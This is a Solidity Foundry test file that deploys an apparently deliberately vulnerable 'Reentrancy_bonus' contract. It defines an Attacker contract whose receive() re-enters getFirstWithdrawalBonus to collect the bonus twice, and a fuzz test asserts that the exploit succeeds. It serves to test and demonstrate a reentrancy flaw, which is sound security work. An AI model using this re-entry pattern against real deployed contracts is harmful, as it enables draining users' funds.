
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) {
        _victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 /*val*/ ) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 /*val*/ ) public {
        initialSnapshot = address(this).balance;

        // First call to the vulnerable function
        _victim.getFirstWithdrawalBonus(address(this));

        // If we managed to re-enter and get paid twice, our balance should have increased by more than 100
        if (address(this).balance > initialSnapshot + 100) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the vulnerable function before claimedBonus is set to true
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
